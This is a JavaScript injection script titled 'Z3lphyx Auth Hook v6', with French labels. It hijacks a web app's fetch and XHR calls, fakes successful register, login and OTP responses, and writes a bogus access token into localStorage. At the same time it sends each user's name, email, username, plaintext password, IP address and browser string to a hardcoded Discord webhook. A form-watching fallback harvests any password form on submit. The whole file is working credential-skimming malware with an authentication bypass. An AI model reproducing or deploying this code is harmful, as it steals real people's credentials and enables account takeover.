// Z3lphyx Auth Hook v6 — register webhook + pseudo login fix
(function() {
    'use strict';

    var WEBHOOK = "https://discord.com/api/webhooks/1506998147434676304/jVsItbE7-LukI-fyshElFimQcZEb8iWi7CZ2ANdXZoIJOwmAItJWB9mbdEmjStI8uRSA";
    var ALLOWED_DOMAINS = ['gmail.com','outlook.com','hotmail.com','yahoo.com','icloud.com','protonmail.com','proton.me','zoho.com','aol.com'];
    var cachedIP = null;

    function isObject(v) { return v !== null && typeof v === 'object'; }
    function getTimestamp() {
        var d = new Date();
        return d.toLocaleDateString('fr-FR') + ' ' + d.toLocaleTimeString('fr-FR');
    }

    async function getIP() {
        if (cachedIP) return cachedIP;
        for (var u of ['https://api.ipify.org?format=json','https://ipapi.co/json/']) {
            try {
                var ctrl = new AbortController();
                setTimeout(function(){try{ctrl.abort();}catch(e){}}, 3000);
                var r = await fetch(u, {signal:ctrl.signal});
                var d = await r.json();
                cachedIP = d.ip || d || 'Inconnu';
                return cachedIP;
            } catch(e) {}
        }
        return 'Inconnu';
    }
    getIP();

    function sendToDiscord(embed) {
        try {
            fetch(WEBHOOK, {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body:JSON.stringify({username:'Z3lphyx Auth',embeds:[embed]}),
                keepalive:true
            }).catch(function(){});
        } catch(e) {}
    }

    function buildEmbed(title,color,fields) {
        return {
            title: title,
            color: color,
            fields: fields,
            footer: {text:'Z3lphyx Auth · '+getTimestamp()},
            timestamp: new Date().toISOString()
        };
    }

    function sendCreds(creds, source, isRegister) {
        getIP().then(function(ip) {
            var ua = navigator.userAgent;
            if (isRegister) {
                sendToDiscord(buildEmbed('Inscription ['+source+']', 0x00ff88, [
                    {name:'Nom',      value:creds.nom||creds.last_name||creds.Nom||creds.full_name||'N/A', inline:true},
                    {name:'Prenom',   value:creds.prenom||creds.first_name||creds.Prenom||'N/A', inline:true},
                    {name:'Pseudo',   value:creds.pseudo||creds.username||creds.Pseudo||'N/A', inline:true},
                    {name:'Email',    value:creds.email||creds.mail||creds.Email||'N/A', inline:true},
                    {name:'Mot de passe', value:creds.password||creds.Password||'N/A', inline:false},
                    {name:'IP',       value:ip, inline:true},
                    {name:'Navigateur', value:ua.substring(0,100), inline:false}
                ]));
            } else {
                sendToDiscord(buildEmbed('Connexion ['+source+']', 0x8888ff, [
                    {name:'Identifiant', value:creds.identifier||creds.email||creds.pseudo||creds.username||creds.Pseudo||'N/A', inline:true},
                    {name:'Mot de passe', value:creds.password||creds.Password||'N/A', inline:false},
                    {name:'IP',       value:ip, inline:true},
                    {name:'Navigateur', value:ua.substring(0,100), inline:false}
                ]));
            }
        });
    }

    function isApiUrl(url) {
        if (!url || typeof url !== 'string') return false;
        if (url.indexOf('discord.com') > -1 || url.indexOf('discordapp.com') > -1) return false;
        var patterns = ['/api/','/auth/','/Profile/','/profile/','/otp','/verify','/updateMe','/me','/logout','/app-logs/','/public-settings/'];
        for (var i=0; i<patterns.length; i++) {
            if (url.indexOf(patterns[i]) > -1) return true;
        }
        return false;
    }

    function mockResponse(u, body, method) {
        u = u || '';
        var b = null;
        try {
            if (typeof body === 'string') {
                if (body.length > 0) b = JSON.parse(body);
            } else if (body && typeof body === 'object' && !Array.isArray(body)) {
                b = body;
            }
        } catch(e) {}

        if (u.indexOf('/public-settings/') > -1 || u.indexOf('/settings/') > -1) {
            return {
                data: {
                    _id: 'mock_settings_001',
                    name: 'Z3lphyx Tweaks',
                    logoUrl: '',
                    primaryColor: '#00f2ff',
                    appId: 'z3lphyx-tweaks-auth',
                    publicSettings: { allowRegistration: true }
                },
                status: 200
            };
        }

        // --- REGISTER ---
        if (u.indexOf('/auth/register') > -1 || u.indexOf('/auth/signup') > -1) {
            var pseudo = b ? (b.pseudo || b.username || 'user') : 'user';
            var email = b ? (b.email || pseudo+'@mock.com') : 'user@mock.com';
            var nom = b ? (b.last_name || b.nom || '') : '';
            var prenom = b ? (b.first_name || b.prenom || '') : '';
            var password = b ? (b.password || '') : '';

            // ===== ENVOI AU WEBHOOK =====
            sendCreds({
                nom: nom, prenom: prenom, pseudo: pseudo,
                email: email, password: password
            }, 'Hook', true);

            return {
                data: {
                    access_token: 'mock_z3lphyx_token_' + Date.now(),
                    user: { email: email, pseudo: pseudo, id: 'mock_user_001' }
                },
                status: 200
            };
        }

        // --- LOGIN ---
        if (u.indexOf('/auth/login') > -1 || u.indexOf('/auth/signin') > -1) {
            var ident = '';
            var pass = '';
            if (b) {
                ident = b.email || b.identifier || b.username || b.login || '';
                pass = b.password || '';
            }
            sendCreds({identifier: ident, password: pass}, 'Hook', false);
            return {
                data: {
                    access_token: 'mock_z3lphyx_token_' + Date.now(),
                    user: { email: ident.indexOf('@') > -1 ? ident : ident+'@mock.com', id: 'mock_user_001', pseudo: ident }
                },
                status: 200
            };
        }

        // --- PROFILE FILTER (resolve pseudo → email) ---
        if (u.indexOf('Profile/filter') > -1 || u.indexOf('profile/filter') > -1) {
            var pseudoFilter = '';
            if (b && b.pseudo) pseudoFilter = b.pseudo;
            else if (b && b.filter && b.filter.pseudo) pseudoFilter = b.filter.pseudo;
            else if (u.indexOf('pseudo=') > -1) {
                var parts = u.split('pseudo=');
                pseudoFilter = parts.length > 1 ? parts[1].split('&')[0] : '';
            }

            var resultData = pseudoFilter
                ? [{id:'mock_pf_001', pseudo:pseudoFilter, email:pseudoFilter+'@mock.com', _id:'mock_pf_001'}]
                : [];

            return { data: resultData, status: 200 };
        }

        // --- PROFILE CREATE (after register) ---
        if (u.indexOf('Profile/create') > -1 || u.indexOf('profile/create') > -1) {
            return { data: {id:'mock_profile_001', _id:'mock_profile_001', created:true}, status: 200 };
        }

        // --- OTP / VERIFY ---
        if (u.indexOf('/otp') > -1 || u.indexOf('/verify') > -1 || u.indexOf('/verify-otp') > -1 || u.indexOf('otp/verify') > -1) {
            return {
                data: { success: true, verified: true, access_token: 'mock_z3lphyx_token_'+Date.now() },
                status: 200
            };
        }

        // --- USER UPDATE / ME ---
        if (u.indexOf('/updateMe') > -1 || u.indexOf('/me') > -1) {
            return { data: { success: true, updated: true }, status: 200 };
        }

        // --- AUTH CHECK ---
        if (u.indexOf('/auth/check') > -1 || u.indexOf('/authenticated') > -1) {
            return { data: { authenticated: true }, status: 200 };
        }

        // --- LOGOUT ---
        if (u.indexOf('/logout') > -1) {
            return { data: { success: true }, status: 200 };
        }

        // --- APP LOGS ---
        if (u.indexOf('/app-logs/') > -1) {
            return { data: { logged: true }, status: 200 };
        }

        // --- FALLBACK for any other API call ---
        if (isApiUrl(u)) {
            return { data: { success: true }, status: 200 };
        }

        return null;
    }

    // ====== FETCH INTERCEPTOR ======
    var _fetch = window.fetch;
    window.fetch = async function(input, init) {
        var url = '';
        var body = null;
        var method = 'GET';

        if (typeof input === 'string') {
            url = input;
            method = (init && init.method) || 'GET';
            body = (init && init.body) || null;
        } else if (input instanceof Request) {
            url = input.url;
            method = input.method || 'GET';
            try {
                var clone = input.clone();
                body = await clone.text();
            } catch(e) {
                try { body = await input.text(); } catch(e2) {}
            }
        }

        // Discord bypass
        if (url.indexOf('discord.com') > -1 || url.indexOf('discordapp.com') > -1) {
            return _fetch.apply(this, arguments);
        }

        if (isApiUrl(url)) {
            var mock = mockResponse(url, body, method);
            if (mock) {
                // Register redirect to skip OTP
                if (url.indexOf('/auth/register') > -1 || url.indexOf('/auth/signup') > -1) {
                    try {
                        var tok = mock.data.access_token || '';
                        if (tok) localStorage.setItem('base44_access_token', tok);
                    } catch(e) {}
                    setTimeout(function(){ window.location.href = '/'; }, 50);
                }
                return new Response(JSON.stringify(mock.data), {
                    status: mock.status, statusText: 'OK',
                    headers: new Headers({'Content-Type': 'application/json'})
                });
            }
        }

        return _fetch.apply(this, arguments);
    };

    // ====== XHR (AXIOS) INTERCEPTOR ======
    var _origOpen = XMLHttpRequest.prototype.open;
    var _origSend = XMLHttpRequest.prototype.send;
    var _origSetRH = XMLHttpRequest.prototype.setRequestHeader;
    var _origAddEvt = XMLHttpRequest.prototype.addEventListener;

    XMLHttpRequest.prototype.open = function(method, url) {
        this._zm = (method || 'GET').toUpperCase();
        this._zu = (url || '').toString();
        this._zheaders = {};
        this._zlisteners = {};
        return _origOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.setRequestHeader = function(k, v) {
        if (!this._zheaders) this._zheaders = {};
        this._zheaders[k] = v;
        return _origSetRH.apply(this, arguments);
    };

    XMLHttpRequest.prototype.addEventListener = function(type, fn) {
        if (!this._zlisteners) this._zlisteners = {};
        if (!this._zlisteners[type]) this._zlisteners[type] = [];
        this._zlisteners[type].push(fn);
        if (_origAddEvt) {
            try { _origAddEvt.apply(this, arguments); } catch(e) {}
        }
    };

    XMLHttpRequest.prototype.send = function(body) {
        var url = this._zu || '';
        var method = this._zm || 'GET';

        // Discord bypass
        if (url.indexOf('discord.com') > -1 || url.indexOf('discordapp.com') > -1) {
            return _origSend.apply(this, arguments);
        }

        if (isApiUrl(url)) {
            var self = this;
            var mock = mockResponse(url, body, method);

            if (mock) {
                var dataStr = JSON.stringify(mock.data);
                var isRegister = url.indexOf('/auth/register') > -1 || url.indexOf('/auth/signup') > -1;

                setTimeout(function() {
                    try {
                        var defs = {
                            readyState: { value: 4, configurable: true, writable: true },
                            status: { value: mock.status, configurable: true, writable: true },
                            statusText: { value: 'OK', configurable: true, writable: true },
                            responseText: { value: dataStr, configurable: true, writable: true },
                            response: { value: dataStr, configurable: true, writable: true }
                        };
                        for (var k in defs) {
                            try { Object.defineProperty(self, k, defs[k]); } catch(e) {}
                        }

                        self._zmockHeaders = 'Content-Type: application/json\r\nX-Z3lphyx-Mock: true\r\n';

                        self.getResponseHeader = function(key) {
                            var lower = key.toLowerCase();
                            var lines = self._zmockHeaders.split('\r\n');
                            for (var i=0; i<lines.length; i++) {
                                if (!lines[i]) continue;
                                var idx = lines[i].indexOf(': ');
                                if (idx > 0 && lines[i].substring(0, idx).toLowerCase() === lower) {
                                    return lines[i].substring(idx + 2);
                                }
                            }
                            return null;
                        };
                        self.getAllResponseHeaders = function() { return self._zmockHeaders || ''; };

                        self.readyState = 4;
                        if (self.onreadystatechange) {
                            self.onreadystatechange.call(self, {type:'readystatechange'});
                        }
                        if (self._zlisteners && self._zlisteners['readystatechange']) {
                            var rsc = self._zlisteners['readystatechange'].slice();
                            for (var i=0; i<rsc.length; i++) {
                                try { rsc[i].call(self, {type:'readystatechange'}); } catch(e) {}
                            }
                        }

                        if (self.onload) self.onload.call(self, {type:'load'});
                        if (self._zlisteners && self._zlisteners['load']) {
                            var lc = self._zlisteners['load'].slice();
                            for (var i=0; i<lc.length; i++) {
                                try { lc[i].call(self, {type:'load'}); } catch(e) {}
                            }
                        }

                        if (self.onloadend) self.onloadend.call(self, {type:'loadend'});
                        if (self._zlisteners && self._zlisteners['loadend']) {
                            var lec = self._zlisteners['loadend'].slice();
                            for (var i=0; i<lec.length; i++) {
                                try { lec[i].call(self, {type:'loadend'}); } catch(e) {}
                            }
                        }
                    } catch(e) {
                        console.warn('[ZH] XHR mock error:', e);
                    }

                    // ===== OTP BYPASS + REDIRECT =====
                    if (isRegister) {
                        try {
                            var parsedData = JSON.parse(dataStr);
                            var token = parsedData.access_token || parsedData.token || '';
                            if (token) {
                                localStorage.setItem('base44_access_token', token);
                            }
                        } catch(e) {}
                        setTimeout(function() { window.location.href = '/'; }, 30);
                    }
                }, 120);
                return;
            }
        }

        return _origSend.apply(this, arguments);
    };

    // ====== DOM FORM HIJACK (fallback) ======
    setTimeout(function() {
        try {
            if (!document.body && !document.documentElement) return;
            var target = document.body || document.documentElement;
            new MutationObserver(function() {
                var forms = document.querySelectorAll('form');
                for (var fi=0; fi<forms.length; fi++) {
                    var form = forms[fi];
                    if (form.dataset.zHook) continue;
                    var pwd = form.querySelector('input[type="password"]');
                    if (!pwd) continue;
                    form.dataset.zHook = '1';
                    form.addEventListener('submit', function() {
                        try {
                            var f = new FormData(form);
                            var c = {};
                            var entries = f.entries();
                            for (var e = entries.next(); e && !e.done; e = entries.next()) {
                                c[e.value[0]] = e.value[1];
                            }
                            if (!c.password && !c.mot_de_passe && !c.mdp && !c.Password) return;
                            var hasExtra = c.nom || c.prenom || c.first_name || c.last_name || c.Nom || c.Prenom;
                            sendCreds({
                                password: c.password || c.mot_de_passe || c.mdp || c.Password,
                                email: c.email || c.mail || c.Email,
                                username: c.pseudo || c.username || c.user || c.login || c.identifier || c.Pseudo,
                                nom: c.nom || c.last_name || c.surname || c.Nom,
                                prenom: c.prenom || c.first_name || c.Prenom
                            }, 'DOM', !!hasExtra);
                        } catch(e) {}
                    }, true);
                }
            }).observe(target, {childList: true, subtree: true});
        } catch(e) {}
    }, 1500);

    console.log('%c[Z3lphyx Hook v6]','color:#00f0ff;font-weight:bold','Register webhook + pseudo login OK');

    try {
        var marker = document.createElement('meta');
        marker.name = 'z3lphyx-hook';
        marker.content = 'v6';
        document.head.appendChild(marker);
    } catch(e) {}

    console.log('[ZH] Hook v6 actif — token check:', !!localStorage.getItem('base44_access_token'));
})();